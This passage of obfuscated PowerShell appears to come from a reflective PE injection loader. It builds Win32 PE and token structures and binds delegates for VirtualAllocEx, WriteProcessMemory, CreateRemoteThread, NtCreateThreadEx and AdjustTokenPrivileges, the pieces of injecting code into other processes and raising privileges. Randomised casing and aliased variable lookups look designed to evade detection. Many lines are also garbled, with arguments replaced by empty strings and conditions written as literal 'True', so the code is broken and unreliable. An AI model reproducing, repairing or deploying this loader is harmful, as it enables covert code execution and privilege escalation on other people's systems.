   ${iMAGE_SEcTION_HeaDEr} = ${tYPeBUilDeR}.'CreateType'.Invoke()
   ${wiN32TYPeS} | &'Add-Member' -MemberType 'NoteProperty' -Name 'IMAGE_SECTION_HEADER' -Value ${ImAGe_SecTiOn_HeadeR}
 
 
   ${ATTribUtes} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
   ${typEbuIlDer} = ${MOdulEBuildEr}.'DefineType'.Invoke'IMAGE_BASE_RELOCATION  System.ValueType 8'
   ${TyPEBuiLDEr}.'DefineField'.Invoke'VirtualAddress System.UInt32 Public' | &'Out-Null'
   ${typeBUIlDER}.'DefineField'.Invoke'SizeOfBlock System.UInt32 Public' | &'Out-Null'
   ${IMAGE_BAsE_ReLOcation} = ${tYPeBUILDER}.'CreateType'.Invoke()
   ${WiN32TyPEs} | &'Add-Member' -MemberType 'NoteProperty' -Name 'IMAGE_BASE_RELOCATION' -Value ${iMAge_Base_rELOCATioN}
 
 
   ${AtTRIBuTEs} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
   ${typEBUilDEr} = ${MoDuleBuiLder}.'DefineType'.Invoke'IMAGE_IMPORT_DESCRIPTOR  System.ValueType 20'
   ${typeBuiLDER}.'DefineField'.Invoke'Characteristics System.UInt32 Public' | &'Out-Null'
   ${typeBuILdEr}.'DefineField'.Invoke'TimeDateStamp System.UInt32 Public' | &'Out-Null'
   ${tYpEBUILDer}.'DefineField'.Invoke'ForwarderChain System.UInt32 Public' | &'Out-Null'
   ${tYpeBuilDEr}.'DefineField'.Invoke'Name System.UInt32 Public' | &'Out-Null'
   ${TYPeBUIlDEr}.'DefineField'.Invoke'FirstThunk System.UInt32 Public' | &'Out-Null'
   ${imAGe_ImPORT_DescRipTOR} = ${TyPeBUIlDeR}.'CreateType'.Invoke()
   ${wIN32Types} | &'Add-Member' -MemberType 'NoteProperty' -Name 'IMAGE_IMPORT_DESCRIPTOR' -Value ${iMagE_ImPOrT_desCRIptoR}
 
 
   ${aTTRIbUTeS} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
   ${TyPEBUILdER} = ${mOdULEBUIldEr}.'DefineType'.Invoke'IMAGE_EXPORT_DIRECTORY  System.ValueType 40'
   ${typEBuILDER}.'DefineField'.Invoke'Characteristics System.UInt32 Public' | &'Out-Null'
   ${TyPEbuiLdEr}.'DefineField'.Invoke'TimeDateStamp System.UInt32 Public' | &'Out-Null'
   ${TyPEBuiLDeR}.'DefineField'.Invoke'MajorVersion System.UInt16 Public' | &'Out-Null'
   ${typEbUIldeR}.'DefineField'.Invoke'MinorVersion System.UInt16 Public' | &'Out-Null'
   ${typEBUILDEr}.'DefineField'.Invoke'Name System.UInt32 Public' | &'Out-Null'
   ${tyPEBUiLDeR}.'DefineField'.Invoke'Base System.UInt32 Public' | &'Out-Null'
   ${TYPEBUIldEr}.'DefineField'.Invoke'NumberOfFunctions System.UInt32 Public' | &'Out-Null'
   ${TYpebUilDer}.'DefineField'.Invoke'NumberOfNames System.UInt32 Public' | &'Out-Null'
   ${TYPEBUilDEr}.'DefineField'.Invoke'AddressOfFunctions System.UInt32 Public' | &'Out-Null'
   ${tYPEBUIldeR}.'DefineField'.Invoke'AddressOfNames System.UInt32 Public' | &'Out-Null'
   ${TypEbUildEr}.'DefineField'.Invoke'AddressOfNameOrdinals System.UInt32 Public' | &'Out-Null'
   ${imAgE_expOrT_dIrecToRy} = ${TyPebuiLDer}.'CreateType'.Invoke()
   ${WiN32Types} | &'Add-Member' -MemberType 'NoteProperty' -Name 'IMAGE_EXPORT_DIRECTORY' -Value ${ImAgE_eXpOrT_dIrECtORY}
 
 
   ${ATtrIBUTeS} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
   ${TypebUiLdEr} = ${moDUleBuILdeR}.'DefineType'.Invoke'LUID  System.ValueType 8'
   ${tYpebuILDEr}.'DefineField'.Invoke'LowPart System.UInt32 Public' | &'Out-Null'
   ${typebUIldeR}.'DefineField'.Invoke'HighPart System.UInt32 Public' | &'Out-Null'
   ${lUid} = ${TYPebUiLDeR}.'CreateType'.Invoke()
   ${wIN32TyPeS} | &'Add-Member' -MemberType 'NoteProperty' -Name 'LUID' -Value ${lUID}
 
 
   ${AttRIBUTeS} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
   ${TYPeBUiLder} = ${MoDUlEBuiLDER}.'DefineType'.Invoke'LUID_AND_ATTRIBUTES  System.ValueType 12'
   ${TyPEBuildeR}.'DefineField'.Invoke'Luid  Public' | &'Out-Null'
   ${TyPeBuIlDer}.'DefineField'.Invoke'Attributes System.UInt32 Public' | &'Out-Null'
   ${luid_anD_AttRiBUteS} = ${tyPebuILDER}.'CreateType'.Invoke()
   ${wIN32Types} | &'Add-Member' -MemberType 'NoteProperty' -Name 'LUID_AND_ATTRIBUTES' -Value ${lUID_AND_atTRIBUTES}
 
 
   ${aTTRiButeS} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
   ${typEBUiLDer} = ${ModuLeBuiLdEr}.'DefineType'.Invoke'TOKEN_PRIVILEGES  System.ValueType 16'
   ${TyPeBUIldER}.'DefineField'.Invoke'PrivilegeCount System.UInt32 Public' | &'Out-Null'
   ${TyPebUiLdER}.'DefineField'.Invoke'Privileges  Public' | &'Out-Null'
   ${ToKEN_pRIVILeGES} = ${TYpebuILDER}.'CreateType'.Invoke()
   ${wiN32TypeS} | &'Add-Member' -MemberType 'NoteProperty' -Name 'TOKEN_PRIVILEGES' -Value ${TokeN_prIVileGES}
 
   return ${wIN32typES}
  }
 
  Function gET-win32cONStaNTs
  {
   ${win32CONstANtS} = &'New-Object' 'System.Object'
 
   ${WiN32coNSTanTs} | &'Add-Member' -MemberType 'NoteProperty' -Name 'MEM_COMMIT' -Value 0x00001000
   ${WIN32COnstAnts} | &'Add-Member' -MemberType 'NoteProperty' -Name 'MEM_RESERVE' -Value 0x00002000
   ${Win32CONSTANTs} | &'Add-Member' -MemberType 'NoteProperty' -Name 'PAGE_NOACCESS' -Value 0x01
   ${win32coNStaNtS} | &'Add-Member' -MemberType 'NoteProperty' -Name 'PAGE_READONLY' -Value 0x02
   ${wIN32CoNStaNTs} | &'Add-Member' -MemberType 'NoteProperty' -Name 'PAGE_READWRITE' -Value 0x04
   ${wIn32COnsTAnTs} | &'Add-Member' -MemberType 'NoteProperty' -Name 'PAGE_WRITECOPY' -Value 0x08
   ${WiN32cONStANts} | &'Add-Member' -MemberType 'NoteProperty' -Name 'PAGE_EXECUTE' -Value 0x10
   ${Win32CoNsTANts} | &'Add-Member' -MemberType 'NoteProperty' -Name 'PAGE_EXECUTE_READ' -Value 0x20
   ${wIN32CONsTANtS} | &'Add-Member' -MemberType 'NoteProperty' -Name 'PAGE_EXECUTE_READWRITE' -Value 0x40
   ${WIN32CONsTANTs} | &'Add-Member' -MemberType 'NoteProperty' -Name 'PAGE_EXECUTE_WRITECOPY' -Value 0x80
   ${WiN32constaNTs} | &'Add-Member' -MemberType 'NoteProperty' -Name 'PAGE_NOCACHE' -Value 0x200
   ${WIN32coNstAnTS} | &'Add-Member' -MemberType 'NoteProperty' -Name 'IMAGE_REL_BASED_ABSOLUTE' -Value 0
   ${wiN32coNSTaNTS} | &'Add-Member' -MemberType 'NoteProperty' -Name 'IMAGE_REL_BASED_HIGHLOW' -Value 3
   ${WIn32ConsTANTS} | &'Add-Member' -MemberType 'NoteProperty' -Name 'IMAGE_REL_BASED_DIR64' -Value 10
   ${wIn32consTaNts} | &'Add-Member' -MemberType 'NoteProperty' -Name 'IMAGE_SCN_MEM_DISCARDABLE' -Value 0x02000000
   ${wIN32CoNsTANTS} | &'Add-Member' -MemberType 'NoteProperty' -Name 'IMAGE_SCN_MEM_EXECUTE' -Value 0x20000000
   ${win32CONSTaNtS} | &'Add-Member' -MemberType 'NoteProperty' -Name 'IMAGE_SCN_MEM_READ' -Value 0x40000000
   ${WiN32cOnsTANTs} | &'Add-Member' -MemberType 'NoteProperty' -Name 'IMAGE_SCN_MEM_WRITE' -Value 0x80000000
   ${wIN32cOnstAnTs} | &'Add-Member' -MemberType 'NoteProperty' -Name 'IMAGE_SCN_MEM_NOT_CACHED' -Value 0x04000000
   ${WiN32CONStAntS} | &'Add-Member' -MemberType 'NoteProperty' -Name 'MEM_DECOMMIT' -Value 0x4000
   ${WIn32coNsTaNts} | &'Add-Member' -MemberType 'NoteProperty' -Name 'IMAGE_FILE_EXECUTABLE_IMAGE' -Value 0x0002
   ${WiN32ConsTants} | &'Add-Member' -MemberType 'NoteProperty' -Name 'IMAGE_FILE_DLL' -Value 0x2000
   ${Win32cOnStAnTS} | &'Add-Member' -MemberType 'NoteProperty' -Name 'IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE' -Value 0x40
   ${WIn32CONSTaNtS} | &'Add-Member' -MemberType 'NoteProperty' -Name 'IMAGE_DLLCHARACTERISTICS_NX_COMPAT' -Value 0x100
   ${WIN32cONstANTs} | &'Add-Member' -MemberType 'NoteProperty' -Name 'MEM_RELEASE' -Value 0x8000
   ${wiN32cONsTaNTs} | &'Add-Member' -MemberType 'NoteProperty' -Name 'TOKEN_QUERY' -Value 0x0008
   ${wIN32consTANTs} | &'Add-Member' -MemberType 'NoteProperty' -Name 'TOKEN_ADJUST_PRIVILEGES' -Value 0x0020
   ${wIN32cOnStAnTs} | &'Add-Member' -MemberType 'NoteProperty' -Name 'SE_PRIVILEGE_ENABLED' -Value 0x2
   ${wIN32coNsTAntS} | &'Add-Member' -MemberType 'NoteProperty' -Name 'ERROR_NO_TOKEN' -Value 0x3f0
 
   return ${WiN32cOnsTAntS}
  }
 
  Function GET-wIN32fUNctions
  {
   ${Win32FunCTIONs} = &'New-Object' 'System.Object'
 
   ${ViRTUALallOcaDdR} = &'Get-ProcAddress' 'kernel32.dll' 'VirtualAlloc'
   ${vIRTUalALlOcdElEgAte} = &'Get-DelegateType' @' System.IntPtr System.UIntPtr System.UInt32 System.UInt32' 'System.IntPtr'
   ${VIrTUAlalLOc} =  (&'gET-vaRIaBle' 'MlHIT').VAlue::'GetDelegateForFunctionPointer'.Invoke' '
   ${WiN32fUnCTIoNS} | &'Add-Member' 'NoteProperty' -Name 'VirtualAlloc' -Value ${ViRtualALlOc}
 
   ${virTUALAlLoCexaDdr} = &'Get-ProcAddress' 'kernel32.dll' 'VirtualAllocEx'
   ${VIrTUalallocEXDelEGAte} = &'Get-DelegateType' @' System.IntPtr System.IntPtr System.UIntPtr System.UInt32 System.UInt32' 'System.IntPtr'
   ${viRTuAlAllOceX} =   (&'vaRIaBLe'  'mLHiT').ValUe::'GetDelegateForFunctionPointer'.Invoke' '
   ${wiN32fUncTiONs} | &'Add-Member' 'NoteProperty' -Name 'VirtualAllocEx' -Value ${vIRTualallOcEx}
 
   ${mEmcPYaDDr} = &'Get-ProcAddress' 'msvcrt.dll' 'memcpy'
   ${MEmCpYdeLegAte} = &'Get-DelegateType' @' System.IntPtr System.IntPtr System.UIntPtr' 'System.IntPtr'
   ${mEmcPy} =   $mlHIT::'GetDelegateForFunctionPointer'.Invoke' '
   ${win32FUnCTIONS} | &'Add-Member' -MemberType 'NoteProperty' -Name 'memcpy' -Value ${MEmCPy}
 
   ${MEMseTadDR} = &'Get-ProcAddress' 'msvcrt.dll' 'memset'
   ${memsetDELeGaTe} = &'Get-DelegateType' @' System.IntPtr System.Int32 System.IntPtr' 'System.IntPtr'
   ${mEmSet} =  (&'get-CHiLDiTEm' VAriAblE:MlHit).vAlUe::'GetDelegateForFunctionPointer'.Invoke' '
   ${WIN32FUnCTions} | &'Add-Member' -MemberType 'NoteProperty' -Name 'memset' -Value ${mEmSEt}
 
   ${lOaDLibRaryAddr} = &'Get-ProcAddress' 'kernel32.dll' 'LoadLibraryA'
   ${LoaDLibRarydElEGAtE} = &'Get-DelegateType' @' System.String' 'System.IntPtr'
   ${LOADlIBrAry} =  (&'Get-cHiLDiTem'  vaRIaBLe:MlhIT).vAlUe::'GetDelegateForFunctionPointer'.Invoke' '
   ${wiN32FUNctions} | &'Add-Member' -MemberType 'NoteProperty' -Name 'LoadLibrary' -Value ${LOADlibRARy}
 
   ${GeTpRocADDrEssADdR} = &'Get-ProcAddress' 'kernel32.dll' 'GetProcAddress'
   ${geTProCAdDReSsdeleGATE} = &'Get-DelegateType' @' System.IntPtr System.String' 'System.IntPtr'
   ${GeTpROcAddrEsS} =   (&'variaBLE' 'mLHIt').vaLUE::'GetDelegateForFunctionPointer'.Invoke' '
   ${wiN32fUNctIonS} | &'Add-Member' -MemberType 'NoteProperty' -Name 'GetProcAddress' -Value ${GEtpRocaddrESs}
 
   ${geTpROcAddrESsintPtRADdr} = &'Get-ProcAddress' 'kernel32.dll' 'GetProcAddress'
   ${GetpRocAddrESsiNTPTrdelEGAte} = &'Get-DelegateType' @' System.IntPtr System.IntPtr' 'System.IntPtr'
   ${GeTpRocAdDrESsiNTPtR} =   (&'variABLe'  MlHIT -VALUe)::'GetDelegateForFunctionPointer'.Invoke' '
   ${WIn32FUNcTions} | &'Add-Member' -MemberType 'NoteProperty' -Name 'GetProcAddressIntPtr' -Value ${GeTPRoCAddReSsINTpTr}
 
   ${virTUALFREEaDDR} = &'Get-ProcAddress' 'kernel32.dll' 'VirtualFree'
   ${VIRTUALfReEDeLegAtE} = &'Get-DelegateType' @' System.IntPtr System.UIntPtr System.UInt32' 'System.Boolean'
   ${viRTUalfrEe} =   (&'geT-VariAble'  'MlHIt').VALUE::'GetDelegateForFunctionPointer'.Invoke' '
   ${WIn32fUnCtioNS} | &'Add-Member' 'NoteProperty' -Name 'VirtualFree' -Value ${VIrTUAlFRee}
 
   ${VIRTUAlFREEeXADdR} = &'Get-ProcAddress' 'kernel32.dll' 'VirtualFreeEx'
   ${ViRTUALfReEexDELegATe} = &'Get-DelegateType' @' System.IntPtr System.IntPtr System.UIntPtr System.UInt32' 'System.Boolean'
   ${viRtuAlFreEeX} =  (&'item'  VARIablE:mLhiT).valUe::'GetDelegateForFunctionPointer'.Invoke' '
   ${Win32FuNCtIoNS} | &'Add-Member' 'NoteProperty' -Name 'VirtualFreeEx' -Value ${vIrtUAlFReeEX}
 
   ${VIRtuaLproTEcTAddr} = &'Get-ProcAddress' 'kernel32.dll' 'VirtualProtect'
   ${vIRTuALProteCtdElEgate} = &'Get-DelegateType' @([IntPtr], [UIntPtr], [UInt32],   $kM5L.'MakeByRefType'.Invoke()) 'System.Boolean'
   ${vIRTUalprOTeCt} =  $MLhIt::'GetDelegateForFunctionPointer'.Invoke' '
   ${wiN32FuNCtiOns} | &'Add-Member' 'NoteProperty' -Name 'VirtualProtect' -Value ${vIrTUAlpROTECT}
 
   ${GeTmOdulehaNDLeadDR} = &'Get-ProcAddress' 'kernel32.dll' 'GetModuleHandleA'
   ${GETmODULEHaNdlEdEleGATe} = &'Get-DelegateType' @' System.String' 'System.IntPtr'
   ${GETmOdulEHaNdLe} =  $mLhit::'GetDelegateForFunctionPointer'.Invoke' '
   ${WiN32fUNCtiONS} | &'Add-Member' 'NoteProperty' -Name 'GetModuleHandle' -Value ${getmoDuLeHANDLE}
 
   ${fReeliBRARyAdDR} = &'Get-ProcAddress' 'kernel32.dll' 'FreeLibrary'
   ${fREElIBRaRYDelEGATE} = &'Get-DelegateType' @' System.IntPtr' 'System.Boolean'
   ${FReElIbraRY} =   $MLHIt::'GetDelegateForFunctionPointer'.Invoke' '
   ${WIn32fuNctiONS} | &'Add-Member' -MemberType 'NoteProperty' -Name 'FreeLibrary' -Value ${fREELIBrAry}
 
   ${oPEnproCessAddr} = &'Get-ProcAddress' 'kernel32.dll' 'OpenProcess'
      ${opENPRoCesSdEleGATe} = &'Get-DelegateType' @' System.UInt32 System.Boolean System.UInt32' 'System.IntPtr'
      ${OPENpRoceSs} =   $mLhiT::'GetDelegateForFunctionPointer'.Invoke' '
   ${wiN32FuncTIONS} | &'Add-Member' -MemberType 'NoteProperty' -Name 'OpenProcess' -Value ${openprOCesS}
 
   ${wAItFORSInGLeObjeCTAddr} = &'Get-ProcAddress' 'kernel32.dll' 'WaitForSingleObject'
      ${WaITfORsINgLeoBjECTDEleGATe} = &'Get-DelegateType' @' System.IntPtr System.UInt32' 'System.UInt32'
      ${wAiTFoRsiNgLeOBjECT} =  (&'GET-cHILdITem' VarIABLE:mlHIT).VALuE::'GetDelegateForFunctionPointer'.Invoke' '
   ${wIN32FuNctIoNs} | &'Add-Member' -MemberType 'NoteProperty' -Name 'WaitForSingleObject' -Value ${waiTForsIngLEobJECT}
 
   ${WrITEpRocessMEMoRYAddr} = &'Get-ProcAddress' 'kernel32.dll' 'WriteProcessMemory'
         ${WRITepRoCesSmeMORYDeLegaTE} = &'Get-DelegateType' @([IntPtr], [IntPtr], [IntPtr], [UIntPtr],  (&('LS')  varIABlE:9hrwnY).VaLuE.'MakeByRefType'.Invoke()) 'System.Boolean'
         ${WRiTepROcESSMEMoRY} =   (&'Get-VArIAbLE' 'MLhIT').vAlUE::'GetDelegateForFunctionPointer'.Invoke' '
   ${WIN32FUNcTiONS} | &'Add-Member' -MemberType 'NoteProperty' -Name 'WriteProcessMemory' -Value ${WRItEpRocESSMemorY}
 
   ${ReadPRoceSSMemoRyADDr} = &'Get-ProcAddress' 'kernel32.dll' 'ReadProcessMemory'
         ${rEAdproCESSMemoRydelegATe} = &'Get-DelegateType' @([IntPtr], [IntPtr], [IntPtr], [UIntPtr],  (&'ItEM' 'vaRiAble:9HrWNY').vAlUe.'MakeByRefType'.Invoke()) 'System.Boolean'
         ${reaDpRocEssMeMoRY} =   (&'DIr'  VarIaBLE:MlHIT).vaLue::'GetDelegateForFunctionPointer'.Invoke' '
   ${win32FuNcTIoNs} | &'Add-Member' -MemberType 'NoteProperty' -Name 'ReadProcessMemory' -Value ${readPROcESsMeMoRy}
 
   ${CREATeREMoTetHREadaDDr} = &'Get-ProcAddress' 'kernel32.dll' 'CreateRemoteThread'
         ${cREaTEremoTeThrEaDdelEgaTe} = &'Get-DelegateType' @' System.IntPtr System.IntPtr System.UIntPtr System.IntPtr System.IntPtr System.UInt32 System.IntPtr' 'System.IntPtr'
         ${CReAteREMOtETHReAd} =  (&'vaRiabLE'  mLhIt).VaLue::'GetDelegateForFunctionPointer'.Invoke' '
   ${win32FuNCTIoNs} | &'Add-Member' -MemberType 'NoteProperty' -Name 'CreateRemoteThread' -Value ${CREAteReMoTeThReAD}
 
   ${GETExITCOdETHReADAdDr} = &'Get-ProcAddress' 'kernel32.dll' 'GetExitCodeThread'
         ${GETEXitCodETHrEADdELEGaTE} = &'Get-DelegateType' @([IntPtr],  (&'iTem'  VaRIABlE:7eq).VAluE.'MakeByRefType'.Invoke()) 'System.Boolean'
         ${GETEXiTcOdEThReAd} =   (&('GI')  ("VariABLE"+":mL"+"hit")).VALUE::'GetDelegateForFunctionPointer'.Invoke' '
   ${wIN32FUNcTions} | &'Add-Member' -MemberType 'NoteProperty' -Name 'GetExitCodeThread' -Value ${GetexITCOdeThREAD}
 
   ${OPeNtHreAdTokenADDR} = &'Get-ProcAddress' 'Advapi32.dll' 'OpenThreadToken'
         ${OPENTHreAdtoKEndelEgATE} = &'Get-DelegateType' @([IntPtr], [UInt32], [Bool],   $T2NGf.'MakeByRefType'.Invoke()) 'System.Boolean'
         ${opeNthreadtokEN} =  $MLhit::'GetDelegateForFunctionPointer'.Invoke' '
   ${win32FunCTIoNs} | &'Add-Member' -MemberType 'NoteProperty' -Name 'OpenThreadToken' -Value ${OpeNThrEADTokEN}
 
   ${GetcuRrEntThREAdAddR} = &'Get-ProcAddress' 'kernel32.dll' 'GetCurrentThread'
         ${gETCUrrENTThreaDDeLEGATe} = &'Get-DelegateType' @() 'System.IntPtr'
         ${GeTcuRREnTTHReAD} =   $mlHIT::'GetDelegateForFunctionPointer'.Invoke' '
   ${WiN32fuNctiONs} | &'Add-Member' -MemberType 'NoteProperty' -Name 'GetCurrentThread' -Value ${GETCURReNtTHReAd}
 
   ${AdJUsTTOKENPRiViLEGeSAddR} = &'Get-ProcAddress' 'Advapi32.dll' 'AdjustTokenPrivileges'
         ${aDJusTtOKEnPRiVIlEGesDELEGATE} = &'Get-DelegateType' @' System.IntPtr System.Boolean System.IntPtr System.UInt32 System.IntPtr System.IntPtr' 'System.Boolean'
         ${adJUSTToKENPRIvIlEGeS} =   $MlHiT::'GetDelegateForFunctionPointer'.Invoke' '
   ${Win32funCTioNS} | &'Add-Member' -MemberType 'NoteProperty' -Name 'AdjustTokenPrivileges' -Value ${adJuSTtokenpRIVILEGES}
 
   ${LoOkupPriVILegeVALUEAdDr} = &'Get-ProcAddress' 'Advapi32.dll' 'LookupPrivilegeValueA'
         ${LOOKUpPRiVilegEValUEdeLegAte} = &'Get-DelegateType' @' System.String System.String System.IntPtr' 'System.Boolean'
         ${LOokUPpRiVilEGEVAlUE} =   (&'DIR'  VarIaBLE:MLHiT).VALUe::'GetDelegateForFunctionPointer'.Invoke' '
   ${wIn32FUNcTiOns} | &'Add-Member' -MemberType 'NoteProperty' -Name 'LookupPrivilegeValue' -Value ${LookUPpRivIlEGevaLUE}
 
   ${imPeRsonaTESeLFaDDR} = &'Get-ProcAddress' 'Advapi32.dll' 'ImpersonateSelf'
         ${ImPersONaTeseLfdElEgate} = &'Get-DelegateType' @' System.Int32' 'System.Boolean'
         ${ImpersONAtesELf} =  (&'gEt-vArIAble'  'MlHit'  -va)::'GetDelegateForFunctionPointer'.Invoke' '
   ${win32FUNcTiOnS} | &'Add-Member' -MemberType 'NoteProperty' -Name 'ImpersonateSelf' -Value ${IMPERSoNAtEselF}
 
 
         if (($uRyi12::"OSvERsIon"."VeRsiOn" -ge (&'New-Object' 'Version' 6,0)) -and 'True') {
       ${NTCREateThreAdeXADDR} = &'Get-ProcAddress' 'NtDll.dll' 'NtCreateThreadEx'
             ${NTCREAteTHReadexDeLeGATE} = &'Get-DelegateType' @($T2Ngf.'MakeByRefType'.Invoke(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) 'System.UInt32'
             ${NtcrEaTetHreADEX} =   (&('Gi') ('Va'+'RiAb'+'lE'+':mlHIT')).vAlue::'GetDelegateForFunctionPointer'.Invoke' '
       ${wIN32FUNCTioNS} | &'Add-Member' -MemberType 'NoteProperty' -Name 'NtCreateThreadEx' -Value ${nTcrEAteTHreAdex}
         }
 
   ${IswoW64ProCESSAdDR} = &'Get-ProcAddress' 'Kernel32.dll' 'IsWow64Process'
         ${IswoW64PRocEssdeLegate} = &'Get-DelegateType' @([IntPtr],  (&'Gci' VarIaBlE:tiaFhC).ValuE.'MakeByRefType'.Invoke()) 'System.Boolean'
         ${ISWOw64ProCeSS} =  (&('Gi')  VARiAbLe:Mlhit).vaLUE::'GetDelegateForFunctionPointer'.Invoke' '
   ${wIN32fUnctiOns} | &'Add-Member' -MemberType 'NoteProperty' -Name 'IsWow64Process' -Value ${ISwoW64prOcess}
 
   ${creATEThReadadDR} = &'Get-ProcAddress' 'Kernel32.dll' 'CreateThread'
         ${CReaTETHReadDeLeGaTe} = &'Get-DelegateType' @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32],   (&'Get-VariabLe'  km5L  -vALu).'MakeByRefType'.Invoke()) 'System.IntPtr'
         ${CREATeTHrEAd} =   (&'GeT-VarIabLe' 'MLhIT').vALUE::'GetDelegateForFunctionPointer'.Invoke' '
   ${wIN32FUncTIonS} | &'Add-Member' -MemberType 'NoteProperty' -Name 'CreateThread' -Value ${CreatEtHREad}
 
   return ${wiN32funCTIons}
  }
 
 
 
 
 
 
 
 
 
  Function sUB-SiGNEDInTAsUNSIGnEd
  {
   Param(
   [Parameter(pOSitIoN = 0, MAnDAtorY = ${tRUE})]
   [Int64]
   ${vAlUE1},
 
   [Parameter(posITiOn = 1, MANDAtORy = ${TRUE})]
   [Int64]
   ${VAlue2}
 )
 
   [Byte[]]${vALuE1BYtES} =  $xd1h::'GetBytes'.Invoke(${VALue1})
   [Byte[]]${ValUe2ByTES} =  $xD1H::'GetBytes'.Invoke(${vaLUe2})
   [Byte[]]${fINalByTeS} =  $xD1H::"GeTByTes"([UInt64]0)
 
   if 'True'
   {
    ${cARRyoVER} = 0
    for (${I} = 0; ${I} -lt ${vaLUe1BYTeS}."cOUNt"; ${I}++)
    {
     ${VAL} = ${VALuE1BYtEs}[${I}] - ${cARRyoVEr}
 
     if (${vAL} -lt ${Value2BYTES}[${i}])
     {
      ${vAl} += 256
      ${CARRyOvEr} = 1
     }
     else
     {
      ${carRyoveR} = 0
     }
 
 
     [UInt16]${SUm} = ${vAL} - ${valUe2BYteS}[${i}]
 
     ${finAlBYTeS}[${i}] = ${sUm} -band 0x00FF
    }
   }
   else
   {
    Throw 'Cannot subtract bytearrays of different sizes'
   }
 
   return  $xD1H::'ToInt64'.Invoke' 0'
  }
 
 
  Function add-SiGnedintasUNsiGnED
  {
    Param(
   [Parameter(POSITiOn = 0, mandAtOrY = ${TRUe})]
   [Int64]
   ${ValUe1},
 
   [Parameter(pOsItioN = 1, manDaTorY = ${tRUE})]
   [Int64]
   ${value2}
 )
 
   [Byte[]]${vALUE1byteS} =  (&'GET-vaRiAbLe'  'XD1h'  -vaLUeoNL)::'GetBytes'.Invoke(${valuE1})
   [Byte[]]${VAluE2ByTEs} =   $XD1H::'GetBytes'.Invoke(${vAlUe2})
   [Byte[]]${FiNALbYTeS} =   (&'VaRiABLE' xd1H -vaLUe)::"GEtBYtES"([UInt64]0)
 
   if 'True'
   {
    ${CaRRyoveR} = 0
    for (${I} = 0; ${i} -lt ${vaLUe1bYTES}."CoUNt"; ${I}++)
    {
 
     [UInt16]${SUM} = ${vaLue1BYteS}[${I}] + ${vALuE2ByTES}[${I}] + ${cARryovEr}
 
     ${fInALbyTes}[${i}] = ${SUm} -band 0x00FF
 
     if ((${sUm} -band 0xFF00) -eq 0x100)
     {
      ${carRYoVeR} = 1
     }
     else
     {
      ${CaRRYOVEr} = 0
     }
    }
   }
   else
   {
    Throw 'Cannot add bytearrays of different sizes'
   }
 
   return   $XD1H::'ToInt64'.Invoke' 0'
  }
 
 
  Function cOMPARe-Val1grEATeRtHaNVaL2aSUinT
  {
   Param(
   [Parameter(POsITIon = 0, mANDATorY = ${TRUE})]
   [Int64]
   ${vALue1},
 
   [Parameter(poSITiON = 1, mAnDATory = ${TrUE})]
   [Int64]
   ${vAlUe2}
 )
 
   [Byte[]]${ValUE1bYTeS} =  (&'GET-vARIaBLE' 'xD1H' -ValuEONlY)::'GetBytes'.Invoke(${VALuE1})
   [Byte[]]${VAlUE2BYTES} =   (&'VariAbLe' 'Xd1H').VaLUE::'GetBytes'.Invoke(${VALUE2})
 
   if 'True'
   {
    for (${i} = ${VaLUe1bYTeS}."CoUnT"-1; ${i} -ge 0; ${I}--)
    {
     if (${vaLuE1Bytes}[${I}] -gt ${VAluE2bYTES}[${I}])
     {
      return ${tRUe}
     }
     elseif (${vAlue1BYTeS}[${I}] -lt ${ValUe2bYtES}[${I}])
     {
      return ${fAlse}
     }
    }
   }
   else
   {
    Throw 'Cannot compare byte arrays of different size'
   }
 
   return ${FALse}
  }
 
 
  Function CoNVErT-UINTToINt
  {
   Param(
   [Parameter(pOSitioN = 0, mANdATORy = ${TRUE})]
   [UInt64]
   ${vALUe}
 )
 
   [Byte[]]${valuEByTes} =   (&'DIR'  VARIAbLE:Xd1h).vALue::'GetBytes'.Invoke(${ValUE})
   return ($xd1H::'ToInt64'.Invoke' 0')
  }
 
 
     Function get-Hex
     {
         Param(
         [Parameter(pOsITIoN = 0, MAnDatoRy = ${trUe})]
         ${VAlUE}
       )
 
         ${vALUESIze} =  (&'VArIAblE' mlhIt).valUE::"SiZEOf"([Type]${vALUE}.'GetType'.Invoke()) * 2
         ${HEx} = "0x{0:X$($ValueSize)}" -f [Int64]${VAluE}
 
         return ${HEx}
     }
 
 
  Function TeSt-mEMoryRANGEvAlId
  {
   Param(
   [Parameter(PosiTIon = 0, mANdAtory = ${tRUE})]
   [String]
   ${DEBuGSTRIng},
 
   [Parameter(PosiTIon = 1, ManDAToRY = ${tRue})]
   [System.Object]
   ${peInFo},
 
   [Parameter(poSitIoN = 2, MANDAtory = ${TrUE})]
   [IntPtr]
   ${STArTaDdresS},
 
   [Parameter(paRamEterSetNAme = "sIZE", PositIOn = 3, maNDatory = ${TRUE})]
   [IntPtr]
   ${SIZE}
 )
 
      [IntPtr]${FINALeNdAddrEss} = [IntPtr](&'Add-SignedIntAsUnsigned' (${stARtADDReSs}) (${Size}))
 
   ${PEenDadDreSs} = ${pEinfo}."ENdADDREss"
 
   if ((&'Compare-Val1GreaterThanVal2AsUInt' (${PEINFO}."PeHaNDle") (${STARTaDDreSs})) -eq ${tRUe})
   {
    Throw 'Trying to write to memory smaller than allocated address range. '
   }
   if ((&'Compare-Val1GreaterThanVal2AsUInt' (${FiNAlEnDaDDRESS}) (${PeendAddReSs})) -eq ${TrUE})
   {
    Throw 'Trying to write to memory greater than allocated address range. '
   }
  }
 
 
  Function wRItE-bYtesTOmeMoRY
  {
   Param(
    [Parameter(POsiTiON=0, mANdAtoRY = ${TRUE})]
    [Byte[]]
    ${bYTeS},
 
    [Parameter(pOsItIOn=1, MandaTORy = ${TRuE})]
    [IntPtr]
    ${meMorYADdREsS}
 )
 
   for (${OFFsEt} = 0; ${OFFset} -lt ${BYtes}."lenGth"; ${OfFSet}++)
   {
      $mlHit::"wRitEByTE"(${memoRYaddRess}, ${OFFset}, ${BYtEs}[${ofFSEt}])
   }
